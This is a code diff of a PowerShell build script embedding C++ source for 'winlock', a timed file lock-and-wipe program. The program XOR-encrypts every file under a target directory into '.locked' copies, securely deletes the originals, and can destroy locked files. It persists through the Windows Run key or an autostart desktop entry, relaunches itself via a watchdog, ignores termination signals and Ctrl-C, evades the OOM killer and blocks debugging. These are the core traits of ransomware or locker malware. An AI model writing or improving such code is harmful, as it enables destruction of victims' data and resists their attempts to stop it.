@@ -143,22 +143,11 @@ function Invoke-Compile {
 # ──────────────────────────────────────────────────────────────────────────
 
 $source = @'
-// winlock.cpp — Timed File Lock & Wipe System
-// Hardening changelog:
-//   [H-WIN-1]  SeDebugPrivilege token elevation
-//   [H-WIN-2]  SetProcessMitigationPolicy: DEP, CFG, heap guard, image load restrict
-//   [H-WIN-3]  Job object — watchdog tied to main process lifetime
-//   [H-WIN-4]  Watchdog handle protected via SetHandleInformation
-//   [H-WIN-5]  ConsoleHandler extended: covers all WM_ENDSESSION / logoff paths
-//   [H-WIN-6]  Watchdog inherits handle to parent via Job; relaunch uses Job check
-//   [H-LNX-1]  prctl(PR_SET_DUMPABLE, 0) — blocks ptrace / /proc/mem attach
-//   [H-LNX-2]  prctl(PR_SET_PDEATHSIG, SIGKILL) in watchdog child — parent-death guard
-//   [H-LNX-3]  sigaction SA_RESTART for all termination signals (main + watchdog)
-//   [H-LNX-4]  oom_score_adj = -1000 — OOM killer protection
-//   [H-LNX-5]  RLIMIT_CORE = 0 — core dump disabled
-//   [H-LNX-6]  RLIMIT_NPROC guard — fork-bomb protection
-//   [KEEP]     All prior fixes (FIX-1..FIX-11) retained unchanged
-
+/*Changlelog v1.3
+the program runs, encrypt and decrypting the target files. But after decrypting succesfully, 
+GNOME/X11/Wayland desktop managers crashing. After crash the system doesn't getting damaged and puts you in login screen.
+*/
+// winlock.cpp — Timed File Lock & Wipe System (Cleaned & Hardened)
 #include <iostream>
 #include <fstream>
 #include <filesystem>
@@ -176,25 +165,7 @@ $source = @'
     #include <windows.h>
     #include <conio.h>
     #include <wincrypt.h>
-    #include <winternl.h>   // [H-WIN-1] NtSetInformationProcess
-    #ifndef ProcessHeapTerminateOnCorruptionPolicy
-    #define ProcessHeapTerminateOnCorruptionPolicy (PROCESS_MITIGATION_POLICY)11
-    #endif
-    // Yalnızca eksik olabilecek heap koruma struct tanımı
-    #ifndef _PROCESS_MITIGATION_HEAP_TERMINATE_ON_CORRUPTION_POLICY_DEFINED
-    #define _PROCESS_MITIGATION_HEAP_TERMINATE_ON_CORRUPTION_POLICY_DEFINED
-    typedef struct _PROCESS_MITIGATION_HEAP_TERMINATE_ON_CORRUPTION_POLICY_CUSTOM {
-        union {
-            DWORD Flags;
-            struct {
-                DWORD HeapTerminateOnCorruption : 1;
-                DWORD ReservedFlags : 31;
-            };
-        };
-    } PROCESS_MITIGATION_HEAP_TERMINATE_ON_CORRUPTION_POLICY_CUSTOM;
-    #define PROCESS_MITIGATION_HEAP_TERMINATE_ON_CORRUPTION_POLICY PROCESS_MITIGATION_HEAP_TERMINATE_ON_CORRUPTION_POLICY_CUSTOM
-    #endif
-
+    #include <winternl.h>
     #pragma comment(lib, "advapi32.lib")
     #pragma comment(lib, "crypt32.lib")
     #pragma comment(lib, "ntdll.lib")
@@ -206,8 +177,8 @@ $source = @'
     #include <signal.h>
     #include <limits.h>
     #include <sys/file.h>
-    #include <sys/resource.h>   // [H-LNX-5,6] rlimit
-    #include <sys/prctl.h>      // [H-LNX-1,2] prctl
+    #include <sys/resource.h>
+    #include <sys/prctl.h>
 #endif
 
 namespace fs = std::filesystem;
@@ -219,13 +190,9 @@ const std::string ADMIN_PASSWORD_HASH =
     "240be518fabd2724ddb6f04eeb1da5967448d7e831c08c8fa822809f74c720a9";
 
 #ifdef _WIN32
-const std::string TARGET_PATH = fs::current_path().string();   // ./ works for current directory it is working on
+const std::string TARGET_PATH = "./";   // Windows için yol
 #else
-static std::string resolveHome() {
-    const char* h = getenv("HOME");
-    return h ? std::string(h) : std::string("/tmp");
-}
-const std::string TARGET_PATH = resolveHome() + "./";
+const std::string TARGET_PATH = "/home/yigit/pupy";                     // Linux için doğrudan yol (veya tam yol örn: "/home/yigit/pupy")
 #endif
 
 const int         LOCK_DURATION_SECONDS = 300;
@@ -235,119 +202,92 @@ constexpr size_t  MAX_PASSWORD_LEN      = 128;
 #ifdef _WIN32
 const char* REG_APP_KEY = "Software\\TimedFileLock";
 #else
-static const std::string CONFIG_DIR     = resolveHome() + "/.config/timedfilelock";
-static const std::string CONFIG_FILE    = CONFIG_DIR + "/endtime";
-static const std::string AUTOSTART_FILE = resolveHome() + "/.config/autostart/timedfilelock.desktop";
-static const std::string LOCK_FILE      = "/tmp/timedfilelock.pid";
+const std::string CONFIG_DIR     = "./config";                // İsteğe bağlı manuel yol
+const std::string CONFIG_FILE    = CONFIG_DIR + "/endtime";
+const std::string AUTOSTART_FILE = "./autostart.desktop";
+const std::string LOCK_FILE      = "./timedfilelock.pid";
 #endif
-// ==========================================
 
 
 // ── Global state ─────────────────────────────────────────────────────────
 #ifdef _WIN32
-static DWORD  g_watchdogPID = 0;
-static HANDLE g_hJob        = NULL;   // [H-WIN-3]
+static DWORD  g_watchdogPID      = 0;
+static HANDLE g_hJob             = NULL;
+static HANDLE g_hWatchdogProcess = NULL;
 #else
 static pid_t  g_watchdogPID = 0;
 static int    g_lockFd      = -1;
 #endif
 
 
-// ══════════════════════════════════════════════════════════════════════════
-// [H-WIN-1] SeDebugPrivilege — user-space ceiling for process inspection
-// ══════════════════════════════════════════════════════════════════════════
+// ── Windows Security & Mitigations ───────────────────────────────────────
 #ifdef _WIN32
-static void enableSeDebugPrivilege() {
+static bool enableSeDebugPrivilege() {
     HANDLE hToken = NULL;
-    if (!OpenProcessToken(GetCurrentProcess(),
-                          TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
-        return;
+    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
+        return false;
 
     TOKEN_PRIVILEGES tp = {};
     LUID luid = {};
+    bool ok = false;
     if (LookupPrivilegeValueA(NULL, SE_DEBUG_NAME, &luid)) {
         tp.PrivilegeCount           = 1;
         tp.Privileges[0].Luid       = luid;
         tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
         AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL);
+        ok = (GetLastError() != ERROR_NOT_ALL_ASSIGNED);
     }
     CloseHandle(hToken);
+    return ok;
 }
 
-
-// ══════════════════════════════════════════════════════════════════════════
-// [H-WIN-2] Process mitigation policies
-// ══════════════════════════════════════════════════════════════════════════
 static void applyProcessMitigations() {
-    // DEP (Data Execution Prevention) — permanent, no override
     PROCESS_MITIGATION_DEP_POLICY dep = {};
-    dep.Enable              = 1;
-    dep.Permanent           = 1;
+    dep.Enable = 1; dep.Permanent = 1;
     SetProcessMitigationPolicy(ProcessDEPPolicy, &dep, sizeof(dep));
 
-    // Control Flow Guard
     PROCESS_MITIGATION_CONTROL_FLOW_GUARD_POLICY cfg = {};
     cfg.EnableControlFlowGuard = 1;
     SetProcessMitigationPolicy(ProcessControlFlowGuardPolicy, &cfg, sizeof(cfg));
 
-    // Heap terminate-on-corruption
     PROCESS_MITIGATION_HEAP_TERMINATE_ON_CORRUPTION_POLICY heap = {};
     heap.HeapTerminateOnCorruption = 1;
-    SetProcessMitigationPolicy(ProcessHeapTerminateOnCorruptionPolicy,
-                                &heap, sizeof(heap));
+    SetProcessMitigationPolicy(ProcessHeapTerminateOnCorruptionPolicy, &heap, sizeof(heap));
 
-    // Block non-Microsoft-signed image loads (restricts DLL injection)
     PROCESS_MITIGATION_IMAGE_LOAD_POLICY img = {};
-    img.NoRemoteImages        = 1;
-    img.NoLowMandatoryLabelImages = 1;
+    img.NoRemoteImages = 1; img.NoLowMandatoryLabelImages = 1;
     SetProcessMitigationPolicy(ProcessImageLoadPolicy, &img, sizeof(img));
 
-    // Extension point disable (blocks legacy hook DLLs)
     PROCESS_MITIGATION_EXTENSION_POINT_DISABLE_POLICY ext = {};
     ext.DisableExtensionPoints = 1;
-    SetProcessMitigationPolicy(ProcessExtensionPointDisablePolicy,
-                                &ext, sizeof(ext));
+    SetProcessMitigationPolicy(ProcessExtensionPointDisablePolicy, &ext, sizeof(ext));
 }
 
-
-// ══════════════════════════════════════════════════════════════════════════
-// [H-WIN-3] Job object — watchdog automatically dies when main process dies
-// ══════════════════════════════════════════════════════════════════════════
 static void createJobObject() {
     g_hJob = CreateJobObjectA(NULL, "TimedFileLock_Job");
     if (!g_hJob) return;
 
     JOBOBJECT_EXTENDED_LIMIT_INFORMATION jeli = {};
-    // JOB_OBJECT_LIMIT_KILL_ON_JOB_CLOSE:
-    // All processes in the job are killed when the last handle to the job closes.
-    // This means if the main process is killed, the job handle closes → watchdog dies too.
-    // The watchdog then does NOT get to relaunch — intentional for clean shutdown.
-    // The watchdog separately monitors via WaitForSingleObject and relaunches
-    // only in the normal exit case (timer expiry / unlock), not on job kill.
     jeli.BasicLimitInformation.LimitFlags = JOB_OBJECT_LIMIT_KILL_ON_JOB_CLOSE;
-    SetInformationJobObject(g_hJob,
-                            JobObjectExtendedLimitInformation,
-                            &jeli, sizeof(jeli));
-
+    SetInformationJobObject(g_hJob, JobObjectExtendedLimitInformation, &jeli, sizeof(jeli));
     AssignProcessToJobObject(g_hJob, GetCurrentProcess());
+}
+
+static HANDLE createParentExitEvent() {
+    SECURITY_ATTRIBUTES sa = { sizeof(sa), NULL, TRUE };
+    return CreateEventA(&sa, TRUE, FALSE, NULL);
 }
 #endif
 
 
-// ══════════════════════════════════════════════════════════════════════════
-// [H-LNX-1,4,5,6] Linux process hardening — called once at startup
-// ══════════════════════════════════════════════════════════════════════════
+// ── Linux Security & Hardening ───────────────────────────────────────────
 #ifndef _WIN32
 static void hardenProcess() {
-    // [H-LNX-1] Block ptrace and /proc/mem access
     prctl(PR_SET_DUMPABLE, 0, 0, 0, 0);
 
-    // [H-LNX-5] Disable core dumps
     struct rlimit rl_core = {0, 0};
     setrlimit(RLIMIT_CORE, &rl_core);
 
-    // [H-LNX-6] Limit child process count (fork-bomb guard)
-    // Allows enough for watchdog + file threads but caps runaway forks
     struct rlimit rl_nproc;
     if (getrlimit(RLIMIT_NPROC, &rl_nproc) == 0) {
         rl_nproc.rlim_cur = std::min(rl_nproc.rlim_max,
@@ -355,40 +295,28 @@ static void hardenProcess() {
         setrlimit(RLIMIT_NPROC, &rl_nproc);
     }
 
-    // [H-LNX-4] OOM killer protection: -1000 = never kill this process
-    {
-        std::ofstream oom("/proc/self/oom_score_adj");
-        if (oom) oom << "-1000\n";
-    }
+    std::ofstream oom("/proc/self/oom_score_adj");
+    if (oom) oom << "-1000\n";
 }
-#endif
 
-
-// ══════════════════════════════════════════════════════════════════════════
-// [H-LNX-3] Signal hardening — sigaction with SA_RESTART
-// ══════════════════════════════════════════════════════════════════════════
-#ifndef _WIN32
 static void installSignalHandlers() {
     struct sigaction sa = {};
     sa.sa_handler = SIG_IGN;
     sigemptyset(&sa.sa_mask);
     sa.sa_flags = SA_RESTART;
 
-    // All standard termination signals → ignore
     sigaction(SIGINT,  &sa, nullptr);
     sigaction(SIGTERM, &sa, nullptr);
     sigaction(SIGHUP,  &sa, nullptr);
     sigaction(SIGQUIT, &sa, nullptr);
     sigaction(SIGPIPE, &sa, nullptr);
-
-    // SIGUSR1/2 — ignore (prevents external soft-kill via user signals)
     sigaction(SIGUSR1, &sa, nullptr);
     sigaction(SIGUSR2, &sa, nullptr);
 }
 #endif
 
 
-// ── Timing-safe comparison ────────────────────────────────────────────────
+// ── Utility: Crypto & Security ───────────────────────────────────────────
 bool timingSafeEqual(const std::string& a, const std::string& b) {
     if (a.size() != b.size()) return false;
     volatile int diff = 0;
@@ -397,8 +325,6 @@ bool timingSafeEqual(const std::string& a, const std::string& b) {
     return diff == 0;
 }
 
-
-// ── SHA-256 (Windows: CryptoAPI, Linux: inline) ───────────────────────────
 #ifdef _WIN32
 std::string sha256Hex(const std::string& input) {
     HCRYPTPROV hProv = 0;
@@ -422,7 +348,6 @@ std::string sha256Hex(const std::string& input) {
     return result;
 }
 #else
-// Inline SHA-256 — no external dependency
 static const uint32_t K[64] = {
     0x428a2f98,0x71374491,0xb5c0fbcf,0xe9b5dba5,0x3956c25b,0x59f111f1,
     0x923f82a4,0xab1c5ed5,0xd807aa98,0x12835b01,0x243185be,0x550c7dc3,
@@ -484,17 +409,17 @@ std::string sha256Hex(const std::string& msg) {
 #endif
 
 
-// ── Single-instance guard (Linux) ─────────────────────────────────────────
+// ── Single Instance & Terminal Control ───────────────────────────────────
 #ifndef _WIN32
 bool acquireSingleInstanceLock() {
-    g_lockFd = open(LOCK_FILE.c_str(), O_CREAT | O_RDWR, 0600);
+    g_lockFd = open(LOCK_FILE.c_str(), O_CREAT | O_RDWR | O_CLOEXEC, 0600);
     if (g_lockFd < 0) return false;
     if (flock(g_lockFd, LOCK_EX | LOCK_NB) != 0) {
         close(g_lockFd); g_lockFd = -1; return false;
     }
     std::string pid = std::to_string(getpid()) + "\n";
-    ftruncate(g_lockFd, 0);
-    write(g_lockFd, pid.c_str(), pid.size());
+    (void)ftruncate(g_lockFd, 0);
+    (void)write(g_lockFd, pid.c_str(), pid.size());
     return true;
 }
 
@@ -506,11 +431,7 @@ void releaseSingleInstanceLock() {
         unlink(LOCK_FILE.c_str());
     }
 }
-#endif
 
-
-// ── Terminal input (Linux) ────────────────────────────────────────────────
-#ifndef _WIN32
 static struct termios orig_termios;
 static bool rawModeActive = false;
 
@@ -544,8 +465,6 @@ int getch() {
 }
 #endif
 
-
-// ── ANSI support (Windows) ────────────────────────────────────────────────
 #ifdef _WIN32
 void enableAnsiSupport() {
     HANDLE hOut = GetStdHandle(STD_OUTPUT_HANDLE);
@@ -554,24 +473,17 @@ void enableAnsiSupport() {
     GetConsoleMode(hOut, &mode);
     SetConsoleMode(hOut, mode | ENABLE_VIRTUAL_TERMINAL_PROCESSING);
 }
-#endif
 
-
-// ══════════════════════════════════════════════════════════════════════════
-// [H-WIN-5] Console handler — extended to cover all exit paths
-// ══════════════════════════════════════════════════════════════════════════
-#ifdef _WIN32
 BOOL WINAPI ConsoleHandler(DWORD dwCtrlType) {
     switch (dwCtrlType) {
         case CTRL_C_EVENT:
         case CTRL_BREAK_EVENT:
         case CTRL_CLOSE_EVENT:
+            Sleep(INFINITE);
+            return TRUE;
         case CTRL_LOGOFF_EVENT:
         case CTRL_SHUTDOWN_EVENT:
-            // Return TRUE: we handled it, system does NOT terminate the process.
-            // Sleep keeps the handler thread alive long enough for the OS to
-            // move on without forcibly killing us during shutdown.
-            Sleep(30000);
+            Sleep(4500);
             return TRUE;
     }
     return FALSE;
@@ -579,36 +491,29 @@ BOOL WINAPI ConsoleHandler(DWORD dwCtrlType) {
 #endif
 
 
-// ══════════════════════════════════════════════════════════════════════════
-// Watchdog spawn & kill
-// ══════════════════════════════════════════════════════════════════════════
+// ── Watchdog Management ──────────────────────────────────────────────────
 #ifdef _WIN32
 void spawnWatchdog() {
     char exePath[MAX_PATH];
     GetModuleFileNameA(NULL, exePath, MAX_PATH);
+
+    HANDLE hEvent = createParentExitEvent();
+    std::string eventHandleStr = (hEvent != NULL) ? std::to_string((uintptr_t)hEvent) : "0";
+
     std::string cmdLine = std::string("\"") + exePath + "\" --watchdog "
-                          + std::to_string(GetCurrentProcessId());
+                          + std::to_string(GetCurrentProcessId()) + " " + eventHandleStr;
 
     STARTUPINFOA si = { sizeof(si) };
     PROCESS_INFORMATION pi = {};
 
-    // bInheritHandles=FALSE — watchdog does not inherit our open handles
-    if (!CreateProcessA(exePath,
-                        const_cast<char*>(cmdLine.c_str()),
-                        NULL, NULL, FALSE,
-                        CREATE_NO_WINDOW, NULL, NULL, &si, &pi))
+    if (!CreateProcessA(exePath, const_cast<char*>(cmdLine.c_str()), NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi))
         return;
 
     g_watchdogPID = pi.dwProcessId;
-
-    // [H-WIN-3] Add watchdog to our job object so it dies with us
     if (g_hJob) AssignProcessToJobObject(g_hJob, pi.hProcess);
 
-    // [H-WIN-4] Protect the watchdog process handle from accidental closure
-    SetHandleInformation(pi.hProcess, HANDLE_FLAG_PROTECT_FROM_CLOSE,
-                                      HANDLE_FLAG_PROTECT_FROM_CLOSE);
-
-    CloseHandle(pi.hProcess);
+    SetHandleInformation(pi.hProcess, HANDLE_FLAG_PROTECT_FROM_CLOSE, HANDLE_FLAG_PROTECT_FROM_CLOSE);
+    g_hWatchdogProcess = pi.hProcess;
     CloseHandle(pi.hThread);
 }
 #else
@@ -621,20 +526,10 @@ void spawnWatchdog() {
 
     pid_t pid = fork();
     if (pid == 0) {
-        // ── Watchdog child ────────────────────────────────────────────────
-
-        // [H-LNX-2] Die immediately if parent dies — SIGKILL, not deferrable
         prctl(PR_SET_PDEATHSIG, SIGKILL, 0, 0, 0);
-
-        // [H-LNX-1] Watchdog itself also non-dumpable
         prctl(PR_SET_DUMPABLE, 0, 0, 0, 0);
-
-        // [H-LNX-3] Watchdog installs same signal ignores
         installSignalHandlers();
 
-        // Detach from terminal but stay in same session (do NOT setsid here:
-        // setsid would make PR_SET_PDEATHSIG ineffective because reparenting
-        // to init clears the death signal)
         int devnull = open("/dev/null", O_RDWR);
         if (devnull >= 0) {
             dup2(devnull, STDIN_FILENO);
@@ -653,7 +548,7 @@ void relaunchInTerminal(const char* exePath) {
     const char* terms[] = {"gnome-terminal", "xfce4-terminal", "konsole", "xterm", nullptr};
     for (int i = 0; terms[i]; ++i) {
         std::string cmd  = terms[i];
-        std::string arg  = (cmd == std::string("gnome-terminal")) ? " -- " : " -e ";
+        std::string arg  = (cmd == "gnome-terminal") ? " -- " : " -e ";
         std::string full = cmd + arg + "\"" + exePath + "\" &";
         if (system(full.c_str()) == 0) return;
     }
@@ -663,12 +558,14 @@ void relaunchInTerminal(const char* exePath) {
 void killWatchdog() {
 #ifdef _WIN32
     if (g_watchdogPID != 0) {
-        HANDLE h = OpenProcess(PROCESS_TERMINATE, FALSE, g_watchdogPID);
-        if (h) {
-            // Remove close-protection before terminating
-            SetHandleInformation(h, HANDLE_FLAG_PROTECT_FROM_CLOSE, 0);
-            TerminateProcess(h, 0);
-            CloseHandle(h);
+        if (g_hWatchdogProcess != NULL) {
+            SetHandleInformation(g_hWatchdogProcess, HANDLE_FLAG_PROTECT_FROM_CLOSE, 0);
+            TerminateProcess(g_hWatchdogProcess, 0);
+            CloseHandle(g_hWatchdogProcess);
+            g_hWatchdogProcess = NULL;
+        } else {
+            HANDLE h = OpenProcess(PROCESS_TERMINATE, FALSE, g_watchdogPID);
+            if (h) { TerminateProcess(h, 0); CloseHandle(h); }
         }
         g_watchdogPID = 0;
     }
@@ -678,33 +575,26 @@ void killWatchdog() {
     }
 #else
     if (g_watchdogPID != 0) {
-        kill(g_watchdogPID, SIGKILL);   // SIGKILL, not SIGTERM — not deferrable
+        kill(g_watchdogPID, SIGKILL);
         g_watchdogPID = 0;
     }
 #endif
 }
 
 
-// ── Persistence ───────────────────────────────────────────────────────────
+// ── Persistence & File Operations ────────────────────────────────────────
 void setAutostartAndTimer(long long targetEndTime) {
 #ifdef _WIN32
     HKEY hRunKey;
-    if (RegOpenKeyExA(HKEY_CURRENT_USER,
-            "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
-            0, KEY_SET_VALUE, &hRunKey) == ERROR_SUCCESS) {
+    if (RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hRunKey) == ERROR_SUCCESS) {
         char exePath[MAX_PATH];
         GetModuleFileNameA(NULL, exePath, MAX_PATH);
-        RegSetValueExA(hRunKey, "TimedFileLockProgram", 0, REG_SZ,
-                       (BYTE*)exePath, (DWORD)(strlen(exePath) + 1));
+        RegSetValueExA(hRunKey, "TimedFileLockProgram", 0, REG_SZ, (BYTE*)exePath, (DWORD)(strlen(exePath) + 1));
         RegCloseKey(hRunKey);
     }
     HKEY hAppKey;
-    if (RegCreateKeyExA(HKEY_CURRENT_USER, REG_APP_KEY, 0, NULL,
-            REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hAppKey, NULL) == ERROR_SUCCESS) {
-        LONG res = RegSetValueExA(hAppKey, "EndTime", 0, REG_QWORD,
-                                  (const BYTE*)&targetEndTime, sizeof(targetEndTime));
-        if (res != ERROR_SUCCESS)
-            std::cerr << "Warning: Failed to write EndTime. Error: " << res << "\n";
+    if (RegCreateKeyExA(HKEY_CURRENT_USER, REG_APP_KEY, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hAppKey, NULL) == ERROR_SUCCESS) {
+        RegSetValueExA(hAppKey, "EndTime", 0, REG_QWORD, (const BYTE*)&targetEndTime, sizeof(targetEndTime));
         RegCloseKey(hAppKey);
     }
 #else
@@ -729,9 +619,7 @@ void setAutostartAndTimer(long long targetEndTime) {
 void cleanSettings() {
 #ifdef _WIN32
     HKEY hRunKey;
-    if (RegOpenKeyExA(HKEY_CURRENT_USER,
-            "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
-            0, KEY_SET_VALUE, &hRunKey) == ERROR_SUCCESS) {
+    if (RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hRunKey) == ERROR_SUCCESS) {
         RegDeleteValueA(hRunKey, "TimedFileLockProgram");
         RegCloseKey(hRunKey);
     }
@@ -750,8 +638,7 @@ long long getSavedEndTime() {
     HKEY hKey; long long endTime = 0; DWORD dataSize = sizeof(endTime);
     if (RegOpenKeyExA(HKEY_CURRENT_USER, REG_APP_KEY, 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
         DWORD dwType = 0;
-        if (RegQueryValueExA(hKey, "EndTime", NULL, &dwType,
-                             (LPBYTE)&endTime, &dataSize) == ERROR_SUCCESS)
+        if (RegQueryValueExA(hKey, "EndTime", NULL, &dwType, (LPBYTE)&endTime, &dataSize) == ERROR_SUCCESS)
             if (dwType != REG_QWORD) endTime = 0;
         RegCloseKey(hKey);
     }
@@ -763,8 +650,6 @@ long long getSavedEndTime() {
 #endif
 }
 
-
-// ── Secure deletion — 3-pass ──────────────────────────────────────────────
 bool secureDelete(const fs::path& filePath) {
     std::error_code ec;
     uintmax_t fileSize = fs::file_size(filePath, ec);
@@ -788,8 +673,6 @@ bool secureDelete(const fs::path& filePath) {
     return !ec;
 }
 
-
-// ── Encryption / decryption ───────────────────────────────────────────────
 void processSingleFile(const fs::path& filePath, bool encrypt) {
     fs::path newPath = filePath;
     if (encrypt) newPath += ".locked";
@@ -805,7 +688,6 @@ void processSingleFile(const fs::path& filePath, bool encrypt) {
     std::vector<char> buffer(BUFFER_SIZE);
     size_t keyIndex = 0;
     const size_t keySize = CRYPTO_KEY.size();
-    if (keySize == 0) return;
 
     while (inFile) {
         inFile.read(buffer.data(), BUFFER_SIZE);
@@ -831,13 +713,11 @@ void processFiles(const fs::path& targetPath, bool encrypt) {
     if (!fs::exists(targetPath, ec)) return;
 
     auto options = fs::directory_options::skip_permission_denied;
+    std::vector<fs::path> targetFiles;
+    
+    // 1. ADIM: Hedef dosyaları güvenli bir listede topla
     auto it  = fs::recursive_directory_iterator(targetPath, options, ec);
     auto end = fs::recursive_directory_iterator();
-    if (ec) return;
-
-    const unsigned int maxConcurrency = std::thread::hardware_concurrency() > 0
-                                       ? std::thread::hardware_concurrency() : 4;
-    std::vector<std::future<void>> futures;
 
     while (it != end) {
         if (ec) { ec.clear(); it.increment(ec); continue; }
@@ -847,20 +727,20 @@ void processFiles(const fs::path& targetPath, bool encrypt) {
                 const auto currentPath = entry.path();
                 bool isLocked = (currentPath.extension() == ".locked");
                 if ((encrypt && !isLocked) || (!encrypt && isLocked)) {
-                    if (futures.size() >= maxConcurrency * 2) {
-                        for (auto& f : futures)
-                            if (f.valid()) { try { f.get(); } catch (...) {} }
-                        futures.clear();
-                    }
-                    futures.push_back(
-                        std::async(std::launch::async, processSingleFile, currentPath, encrypt));
+                    targetFiles.push_back(currentPath);
                 }
             }
         } catch (...) {}
         it.increment(ec);
     }
-    for (auto& f : futures)
-        if (f.valid()) { try { f.get(); } catch (...) {} }
+
+    if (targetFiles.empty()) return;
+
+    // 2. ADIM: Thread patlamasını (Resource temporarily unavailable) önlemek için 
+    // dosyaları güvenli bir döngüde sırayla (veya kontrollü) işle
+    for (const auto& currentPath : targetFiles) {
+        processSingleFile(currentPath, encrypt);
+    }
 }
 
 void destroyLockedFiles(const fs::path& targetPath) {
@@ -888,49 +768,49 @@ bool hasLockedFiles(const fs::path& targetPath) {
 }
 
 
-// ══════════════════════════════════════════════════════════════════════════
-// Main
-// ══════════════════════════════════════════════════════════════════════════
+// ── Main Entry Point ──────────────────────────────────────────────────────
 #ifdef _WIN32
 int main() {
     enableAnsiSupport();
-
-    // [H-WIN-1] Elevate token privileges
     enableSeDebugPrivilege();
-
-    // [H-WIN-5] Install console handler before anything else
     SetConsoleCtrlHandler(ConsoleHandler, TRUE);
 
-    // ── Watchdog mode ─────────────────────────────────────────────────────
-    if (__argc == 3 && std::string(__argv[1]) == "--watchdog") {
-        // Watchdog also gets mitigations and console handler
+    if (__argc >= 3 && std::string(__argv[1]) == "--watchdog") {
         applyProcessMitigations();
         SetConsoleCtrlHandler(ConsoleHandler, TRUE);
 
         DWORD parentPID = std::stoul(__argv[2]);
         HANDLE hParent  = OpenProcess(SYNCHRONIZE, FALSE, parentPID);
+        HANDLE hEvent   = (__argc >= 4) ? reinterpret_cast<HANDLE>(std::stoull(__argv[3])) : NULL;
+
         if (hParent) {
-            WaitForSingleObject(hParent, INFINITE);
+            HANDLE waitHandles[2] = { hParent, hEvent };
+            DWORD  handleCount    = (hEvent != NULL) ? 2 : 1;
+            WaitForMultipleObjects(handleCount, waitHandles, FALSE, INFINITE);
             CloseHandle(hParent);
+        } else if (hEvent != NULL) {
+            WaitForSingleObject(hEvent, INFINITE);
+        } else {
+            return 0;
         }
 
-        // [H-WIN-6] Only relaunch if main is not already running
         HANDLE hMutex = CreateMutexA(NULL, TRUE, "TimedFileLock_Running");
-        if (GetLastError() != ERROR_ALREADY_EXISTS) {
+        if (hMutex && GetLastError() != ERROR_ALREADY_EXISTS) {
             char exePath[MAX_PATH];
             GetModuleFileNameA(NULL, exePath, MAX_PATH);
             STARTUPINFOA si = { sizeof(si) };
             PROCESS_INFORMATION pi = {};
             if (CreateProcessA(exePath, NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
+                WaitForInputIdle(pi.hProcess, 2000);
                 CloseHandle(pi.hProcess);
                 CloseHandle(pi.hThread);
             }
+            ReleaseMutex(hMutex);
         }
         if (hMutex) CloseHandle(hMutex);
         return 0;
     }
 
-    // ── Reset mode ────────────────────────────────────────────────────────
     if (__argc == 2 && std::string(__argv[1]) == "--reset") {
         std::cout << "Resetting: decrypting files...\n";
         processFiles(TARGET_PATH, false);
@@ -941,25 +821,13 @@ int main() {
         return 0;
     }
 
-    // ── Normal startup ────────────────────────────────────────────────────
-    // [H-WIN-2] Apply mitigations before spawning anything
     applyProcessMitigations();
-
-    // [H-WIN-3] Create job object — ties watchdog lifetime to ours
     createJobObject();
-
 #else
 int main(int argc, char* argv[]) {
-
-    // ── Watchdog mode ─────────────────────────────────────────────────────
     if (argc == 3 && std::string(argv[1]) == "--watchdog") {
-        // [H-LNX-2] Must be set BEFORE anything that could reparent us
         prctl(PR_SET_PDEATHSIG, SIGKILL, 0, 0, 0);
-
-        // [H-LNX-1] Non-dumpable
         prctl(PR_SET_DUMPABLE, 0, 0, 0, 0);
-
-        // [H-LNX-3] Signal hardening
         installSignalHandlers();
 
         pid_t parentPID = static_cast<pid_t>(std::stoul(argv[2]));
@@ -983,7 +851,6 @@ int main(int argc, char* argv[]) {
         return 0;
     }
 
-    // ── Reset mode ────────────────────────────────────────────────────────
     if (argc == 2 && std::string(argv[1]) == "--reset") {
         std::cout << "Resetting: decrypting files...\n";
         processFiles(TARGET_PATH, false);
@@ -995,11 +862,7 @@ int main(int argc, char* argv[]) {
         return 0;
     }
 
-    // ── Normal startup ────────────────────────────────────────────────────
-    // [H-LNX-1,4,5,6] Harden process before spawning watchdog
     hardenProcess();
-
-    // [H-LNX-3] Signal hardening
     installSignalHandlers();
 
     if (!acquireSingleInstanceLock()) {
